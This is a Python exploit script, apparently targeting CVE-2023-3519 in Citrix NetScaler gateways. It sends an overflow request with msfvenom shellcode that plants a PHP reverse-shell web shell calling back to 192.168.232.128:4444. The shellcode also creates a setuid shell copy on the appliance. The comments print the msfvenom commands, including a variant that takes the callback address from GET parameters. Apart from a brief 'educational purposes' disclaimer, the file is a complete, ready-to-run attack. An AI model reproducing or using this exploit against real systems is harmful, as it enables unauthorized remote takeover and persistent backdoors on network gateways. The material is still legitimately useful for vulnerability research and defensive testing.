# This code is intended solely for educational purposes and ethical use in understanding
# security vulnerabilities. Any misuse or unauthorized access is strictly prohibited.
# By Md7

from os import system
from sys import argv, exit
from pwn import *

banner = "\n"
banner +="   _____   _____   ___ __ ___ ____   _______ _ ___ \n"
banner +="  / __\ \ / / __|_|_  )  \_  )__ /__|__ / __/ / _ \\\n"
banner +=" | (__ \ V /| _|___/ / () / / |_ \___|_ \__ \ \_, /\n"
banner +="  \___| \_/ |___| /___\__/___|___/  |___/___/_|/_/ \n"
banner +="                                                   \n"


# Generated using msfvenom
# 1 - Hardcoded IP and Port
# msfvenom -p bsd/x64/exec CMD="/var/python/bin/python -c 'import os;os.system(\"\"\"echo \"<?php \\\$sock=fsockopen(\\\\\"192.168.232.128\\\\\",4444);\\\$proc=proc_open(\\\\\"/var/netscaler/logon/sh -i\\\\\", array(0=>\\\$sock, 1=>\\\$sock, 2=>\\\$sock),\\\$pipes);?>\" > /var/netscaler/logon/rce.php; cp /bin/sh /var/netscaler/logon/sh; chmod +s /var/netscaler/logon/sh\"\"\")'" -f py\
# 2 - Using $_GET for dynamic rce
# msfvenom -p bsd/x64/exec CMD="/var/python/bin/python -c 'import os;os.system(\"\"\"echo \"<?php \\\$sock=fsockopen(\\\$_GET[\\\\\"ip\\\\\"],\\\$_GET[\\\\\"port\\\\\"]);\\\$proc=proc_open(\\\\\"/var/netscaler/logon/sh -i\\\\\", array(0=>\\\$sock, 1=>\\\$sock, 2=>\\\$sock),\\\$pipes);?>\" > /var/netscaler/logon/rce.php; cp /bin/sh /var/netscaler/logon/sh; chmod +s /var/netscaler/logon/sh\"\"\")'" -f py
shellcode =  b""
shellcode += b"\x48\x31\xd2\xe8\x3a\x01\x00\x00\x2f\x76\x61\x72"
shellcode += b"\x2f\x70\x79\x74\x68\x6f\x6e\x2f\x62\x69\x6e\x2f"
shellcode += b"\x70\x79\x74\x68\x6f\x6e\x00\x69\x6d\x70\x6f\x72"
shellcode += b"\x74\x20\x6f\x73\x3b\x6f\x73\x2e\x73\x79\x73\x74"
shellcode += b"\x65\x6d\x28\x22\x22\x22\x65\x63\x68\x6f\x20\x22"
shellcode += b"\x3c\x3f\x70\x68\x70\x20\x5c\x24\x73\x6f\x63\x6b"
shellcode += b"\x3d\x66\x73\x6f\x63\x6b\x6f\x70\x65\x6e\x28\x5c"
shellcode += b"\x5c\x22\x31\x39\x32\x2e\x31\x36\x38\x2e\x32\x33"
shellcode += b"\x32\x2e\x31\x32\x38\x5c\x5c\x22\x2c\x34\x34\x34"
shellcode += b"\x34\x29\x3b\x5c\x24\x70\x72\x6f\x63\x3d\x70\x72"
shellcode += b"\x6f\x63\x5f\x6f\x70\x65\x6e\x28\x5c\x5c\x22\x2f"
shellcode += b"\x76\x61\x72\x2f\x6e\x65\x74\x73\x63\x61\x6c\x65"
shellcode += b"\x72\x2f\x6c\x6f\x67\x6f\x6e\x2f\x73\x68\x20\x2d"
shellcode += b"\x69\x5c\x5c\x22\x2c\x20\x61\x72\x72\x61\x79\x28"
shellcode += b"\x30\x3d\x3e\x5c\x24\x73\x6f\x63\x6b\x2c\x20\x31"
shellcode += b"\x3d\x3e\x5c\x24\x73\x6f\x63\x6b\x2c\x20\x32\x3d"
shellcode += b"\x3e\x5c\x24\x73\x6f\x63\x6b\x29\x2c\x5c\x24\x70"
shellcode += b"\x69\x70\x65\x73\x29\x3b\x3f\x3e\x22\x20\x3e\x20"
shellcode += b"\x2f\x76\x61\x72\x2f\x6e\x65\x74\x73\x63\x61\x6c"
shellcode += b"\x65\x72\x2f\x6c\x6f\x67\x6f\x6e\x2f\x72\x63\x65"
shellcode += b"\x2e\x70\x68\x70\x3b\x20\x63\x70\x20\x2f\x62\x69"
shellcode += b"\x6e\x2f\x73\x68\x20\x2f\x76\x61\x72\x2f\x6e\x65"
shellcode += b"\x74\x73\x63\x61\x6c\x65\x72\x2f\x6c\x6f\x67\x6f"
shellcode += b"\x6e\x2f\x73\x68\x3b\x20\x63\x68\x6d\x6f\x64\x20"
shellcode += b"\x2b\x73\x20\x2f\x76\x61\x72\x2f\x6e\x65\x74\x73"
shellcode += b"\x63\x61\x6c\x65\x72\x2f\x6c\x6f\x67\x6f\x6e\x2f"
shellcode += b"\x73\x68\x22\x22\x22\x29\x00\x2d\x63\x00\x5f\x48"
shellcode += b"\x89\xf9\x52\x48\x81\xc1\x17\x00\x00\x00\x51\x48"
shellcode += b"\x81\xc1\x20\x01\x00\x00\x51\x57\x48\x89\xe6\x48"
shellcode += b"\x31\xc0\x48\x83\xc8\x3b\x0f\x05"

# Encode the shellcode to URL-encode (just those which less than \xa0 or 160)
result = b''
for b in shellcode:
    if(b < 160):
        result+= (b'%%%02x' % b)
    else:
        result+= (b).to_bytes(1,'big')


# function for writing payload to a tmp file to send the target
def writePayload(data):
    try:
        with open("payload.tmp", "wb") as file:
            file.write(data)
            file.close()
    except:
        return 1
    print("[+] Payload wrote to tmp file")
    return 0

# function for connecting and sending payload(content of the tmp file)
# Make sure you installed ncat ( apt install ncat ) !!!
def connectGateway(target_ip):
    system(f"cat payload.tmp | ncat --ssl {target_ip} 443 -d 4 -i 4 -w 4 > /dev/null")
    print("[+] Payload sent!")


if(__name__ != "__main__"):
    exit()
else:
    try:
        target_ip = argv[1]
        print(banner)
    except:
        print("[!] python3 cve.py [ip]")
        exit()
    
    padding = b"A" * 168
    jmp_esp = p64(0x6d8c62)

    full_data = b"GET /gwtest/formssso?event=start&target=" + padding + jmp_esp + result + b" HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n"
    if(writePayload(full_data) == 0):
        connectGateway(target_ip)
    else:
        print("[-] Cant write payload to payload.tmp")
        exit()